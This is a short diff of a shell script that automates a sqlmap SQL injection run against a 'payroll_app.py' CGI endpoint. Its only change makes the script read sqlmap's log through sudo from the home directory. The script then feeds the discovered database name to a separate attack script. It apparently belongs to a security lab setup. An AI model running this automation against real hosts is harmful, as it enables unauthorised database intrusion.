@@ -17,7 +17,7 @@ then
 	then 	
 		time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
 	fi
-	tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
+	sudo tail -n 1 ~/.sqlmap/output/$TARGET/log >> dbres.txt
 	DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
 	rm dbres.txt
 	time ./attack-script.sh $TARGET $DATABASE $SERVER
@@ -37,7 +37,7 @@ then
         then 
                 time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
         fi
-        tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
+        sudo tail -n 1 ~/.sqlmap/output/$TARGET/log >> dbres.txt
         DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
         rm dbres.txt
         time ./attack-script.sh $TARGET $DATABASE $SERVER
@@ -57,7 +57,7 @@ then
         then 
                 time sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --flush-session --answers="extending=N" --batch
         fi
-        tail -n 1 /root/.sqlmap/output/$TARGET/log >> dbres.txt
+        sudo tail -n 1 ~/.sqlmap/output/$TARGET/log >> dbres.txt
         DATABASE=$(cat dbres.txt | cut -d" " -f3 | tr '[:upper:]' '[:lower:]') 
         rm dbres.txt
         time ./attack-script.sh $TARGET $DATABASE $SERVER
